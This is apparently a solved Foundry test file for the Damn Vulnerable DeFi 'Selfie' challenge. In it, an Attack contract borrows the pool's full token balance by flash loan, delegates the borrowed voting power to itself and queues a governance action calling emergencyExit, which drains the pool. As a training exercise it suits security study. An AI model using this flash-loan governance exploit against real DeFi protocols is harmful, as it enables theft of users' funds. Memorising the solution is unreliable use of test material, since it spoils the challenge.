// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool, IERC3156FlashBorrower} from "../../src/selfie/SelfiePool.sol";

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);

        Attack attackContract = new Attack(address(pool), address(governance));
        pool.flashLoan(IERC3156FlashBorrower(address(attackContract)), address(token), TOKENS_IN_POOL, data);

        vm.warp(3 days);
        governance.executeAction(1);

        console.log(token.balanceOf(address(pool)));
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}

contract Attack is IERC3156FlashBorrower {
    SelfiePool private pool;
    SimpleGovernance private governance;

    constructor(address _pool, address _governance) {
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
    }

    function onFlashLoan(
        address,
        address token,
        uint256 amount,
        uint256,
        bytes calldata data
    ) external returns (bytes32) {
        // voting logic)
        DamnValuableVotes(token).delegate(address(this));

        governance.queueAction(address(pool), 0, data);

        DamnValuableVotes(token).approve(address(pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
